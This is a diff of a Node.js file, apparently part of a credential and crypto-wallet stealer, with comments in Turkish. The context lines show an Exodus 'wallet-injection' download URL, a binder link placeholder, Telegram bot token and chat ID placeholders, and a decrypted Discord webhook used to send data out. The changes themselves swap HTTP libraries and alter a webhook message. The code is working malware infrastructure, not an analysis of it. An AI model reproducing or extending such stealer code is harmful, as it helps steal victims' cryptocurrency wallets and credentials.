@@ -11,8 +11,6 @@ const execPromise = promisify(exec);
 const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const util = require('util');
-const fetch = require('node-fetch');
-
 function getLocale() {
     return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
 }
@@ -29,6 +27,9 @@ const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
+
+// Axios modülünü dahil et
+const axios = require('axios');
 
 // Global değişken tanımlama
 let discordWebhookUrl = null;
@@ -69,8 +70,8 @@ async function importKey(keyBase64) {
 
 async function fetchData(url) {
     try {
-        const response = await axios.get(url);
-        return response.data;
+        const response = await fetch(url);
+        return await response.text();
     } catch (error) {
         console.error("Veri alınırken hata oluştu:", error);
     }
@@ -107,7 +108,7 @@ async function fetchAndDecrypt() {
     if (discordWebhookUrl) {
         console.log("Webhook URL kullanıma hazır:", discordWebhookUrl);
         const payload = {
-            content: "hash decode success"
+            content: "Mesaj içeriği"
         };
         await sendWebhook(payload);
     } else {
